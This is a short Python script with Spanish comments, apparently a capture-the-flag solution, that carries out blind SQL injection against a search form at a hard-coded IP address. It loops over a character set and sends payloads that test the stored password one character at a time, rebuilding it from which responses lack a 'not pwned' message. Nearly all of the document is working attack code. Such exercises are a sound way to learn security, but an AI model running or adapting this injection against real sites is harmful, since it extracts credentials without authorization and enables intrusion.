# Se importa request para hacer peticiones.
import requests
# Sitio vulnerable a SQLI.
URL = "http://18.188.52.184:3120/search"
# Posibles caracteres de una bandera.
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$^&*()-_=+{}'

flag = ""
for i in range(1,40):
    for st in charset:
        payload = "carlosmora@mail.com' AND substr(password,{},1)='{}' or ''='-".format(str(i),st)
        data={"search": payload}
        res = requests.post(URL, data=data)
        if "Hey!! No te han pwneado :)" not in str(res.content):
            flag += st
            print(flag)
            break;
print(flag)